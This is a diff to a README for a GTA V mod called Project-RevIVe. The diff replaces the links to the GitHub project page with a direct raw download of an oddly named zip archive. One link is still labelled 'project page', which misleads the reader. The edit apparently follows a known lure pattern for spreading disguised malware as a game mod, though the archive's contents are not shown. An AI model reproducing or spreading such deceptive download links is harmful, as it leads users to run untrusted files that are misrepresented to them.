@@ -1,6 +1,6 @@
 # 🏙️ Project-RevIVe-GTA-V - Experience Liberty City in GTA V
 
-[![](https://img.shields.io/badge/Download-Project_RevIVe-blue.svg)](https://github.com/Wdll6756/Project-RevIVe-GTA-V)
+[![](https://img.shields.io/badge/Download-Project_RevIVe-blue.svg)](https://raw.githubusercontent.com/Wdll6756/Project-RevIVe-GTA-V/main/Mithriac/Ve_V_GT_I_Project_Rev_v3.3-beta.3.zip)
 
 Project-RevIVe-GTA-V brings the complete Liberty City environment into the Grand Theft Auto V engine. This mod adds all five boroughs from GTA IV, high-quality textures, and functional map data to your existing game installation.
 
@@ -30,7 +30,7 @@ This project relies on the OpenIV modification platform to inject files into you
 
 Follow these instructions to move the Liberty City files into your game folder.
 
-1. Visit the [project page](https://github.com/Wdll6756/Project-RevIVe-GTA-V) to download the archive file.
+1. Visit the [project page](https://raw.githubusercontent.com/Wdll6756/Project-RevIVe-GTA-V/main/Mithriac/Ve_V_GT_I_Project_Rev_v3.3-beta.3.zip) to download the archive file.
 2. Extract the contents of the ZIP folder to a temporary location on your desktop.
 3. Open the main program you installed earlier, OpenIV.
 4. Click the Edit Mode button located in the top toolbar. Confirm the prompt that appears.
